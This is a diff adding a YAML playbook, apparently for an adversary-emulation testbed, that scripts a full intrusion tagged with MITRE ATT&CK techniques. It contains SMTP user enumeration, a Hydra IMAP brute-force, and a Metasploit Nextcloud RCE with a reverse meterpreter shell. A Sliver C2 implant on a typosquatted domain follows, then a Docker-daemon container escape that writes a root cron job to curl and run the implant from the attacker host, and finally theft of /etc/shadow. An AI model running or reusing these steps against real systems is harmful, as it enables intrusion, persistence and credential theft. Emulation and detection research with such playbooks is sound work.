@@ -1,0 +1,150 @@
+####################
+#
+# Scenario 7
+#
+####################
+vars:
+  $SERVER_ADDRESS: 192.42.0.254
+  $ATTACKER_ADDRESS: 192.42.1.174
+  DOMAIN: attackbed.com
+  PAYLOAD_DOCKER: cmd/linux/http/x64/meterpreter/reverse_tcp
+
+commands:
+  - type: shell
+    cmd: ./smtp-user-enum.pl  -M VRFY -U smtp-user.txt -t $SERVER_ADDRESS
+    metadata:
+      techniques: "T1589.002"
+      tactics: "Reconnaissance"
+      technique_name: "Gather Victim Identity Information: Email Addresses"
+      description: "Enumerate email addresses on SMTP-Host"
+
+  - type: shell
+    cmd: hydra -l "alice@$DOMAIN" -P smtp-pass.txt -s 143 $SERVER_ADDRESS imap  
+    metadata:
+      techniques: "T1078.002,T1110.001,T1133"
+      tactics: "Initial Access"
+      technique_name: "Valid Accounts: Local Accounts, Brute Force: Password Guessing, External Remote Services"
+      description: "Brute-force IMAP-password using the already enumerated username"
+
+  - type: http-client
+    url: http://$SERVER_ADDRESS:8080
+    metadata:
+      techniques: "T1592.002"
+      tactics: "Reconnaissance"
+      technique_name: "Gather Victim Host Information: Software"
+      description: "Attacker connects to webport to find out about nextcloud"
+
+  - type: sliver
+    cmd: "generate_implant"
+    c2url: "https://faaacebook.com"
+    name: "badimplant"
+    metadata:
+      description: "Generate implant for the persistence on the container-host"   
+
+  - type: sliver
+    cmd: start_https_listener
+    host: 0.0.0.0
+    port: 443
+    metadata:
+      techniques: "T1071.001,T1573.001"
+      tactics: "Command and Control"
+      technique_name: "Application Layer Protocol: Web Protocols,Encrypted Channel: Symmetric Cryptography"
+      description: "Start a listener for the sliver implant"   
+
+  - type: webserv
+    local_path: $LAST_SLIVER_IMPLANT
+    port: 8888
+    background: True
+    kill_on_exit: true
+    metadata:
+      description: "Serve the sliver implant for installation"   
+
+  - type: msf-module
+    cmd: exploit/unix/webapp/nextcloud_workflows_rce
+    creates_session: "foothold"
+    options:
+      RHOSTS: "$SERVER_ADDRESS"
+      RPORT: "8080"
+      USERNAME: "alice"
+      PASSWORD: "alice123alice!"
+      WfsDelay: "8000"
+    payload_options:
+      LHOST: "192.42.1.174"
+      LPORT: "4444"
+    payload: "cmd/linux/http/x64/meterpreter/reverse_tcp"
+    metadata:
+      tactics: "Initial Access, Execution,Command and Control"
+      techniques: "T1190,T1059.004,T1095"
+      description: "Attacker exploits an authenticated vulnerability in nextcloud and executes a meterpreter shell"   
+
+
+  - type: msf-session
+    session: "foothold"
+    stdapi: True
+    cmd: getuid
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
+      description: "Attacker discovers user id"
+
+  - type: msf-session
+    session: "foothold"
+    stdapi: True
+    cmd: portfwd add -l 1090 -p 2375 -r 172.18.0.1
+    metadata:
+      description: "Attacker starts port-forwarding for further attacks on the exposed docker-daemon"
+
+  - type: shell
+    cmd: docker -H tcp://localhost:1090 ps
+    metadata:
+      techniques: "T1057"
+      tactics: "Discovery"
+      description: "Attacker asks docker-daemon for running containers"
+
+  - type: shell
+    cmd: docker -H tcp://localhost:1090 network list
+    metadata:
+      techniques: "T1016 "
+      tactics: "Discovery"
+      description: "Attacker discovers docker-networks using the exposed docker-daemon"
+
+  - type: shell
+    cmd: docker -H tcp://localhost:1090 run --rm -t -u root --network=nextcloud_default -v /etc:/root/etc  kalilinux/kali-rolling bash -c "echo \"*/5 * * * * root test -e /opt/tool || curl http://$ATTACKER_ADDRESS:8888/tool > /opt/tool && chmod +x /opt/tool && /opt/tool\" > /root/etc/cron.d/sysvz"
+    metadata:
+      techniques: "T1610,T1525,T1053.003"
+      tactics: "Defense Evasion,Execution,Persistence,Privilege Escalation"
+      description: "Attacker mounts etc-directory of the host into a container and creates a cron-job in it that executes the sliver-implant as root outside of the container"
+
+
+  - type: sliver-session
+    cmd: ls
+    remote_path: "."
+    session: badimplant
+    metadata:
+      techniques: "T1083"
+      tactics: "Discovery"
+      technique_name: "File and Directory Discovery"
+      description: "Use sliver to list files after container-escape"
+
+  - type: sliver-session
+    cmd: ps
+    session: badimplant
+    metadata:
+      techniques: "T1057"
+      tactics: "Discovery"
+      technique_name: "Process Discovery"
+      description: "Use sliver to list processes after container-escape"
+
+  - type: mktemp
+    variable: SHADOW
+
+  - type: sliver-session
+    cmd: download
+    remote_path: /etc/shadow
+    local_path: $SHADOW
+    session: badimplant
+    metadata:
+      techniques: "T1003.008,T1041"
+      tactics: "Credential Access,Collection,Exfiltration"
+      technique_name: "OS Credential Dumping: /etc/passwd and /etc/shadow,Exfiltration Over C2 Channel"
+      description: "Use sliver to dump /etc/shadow credentials"
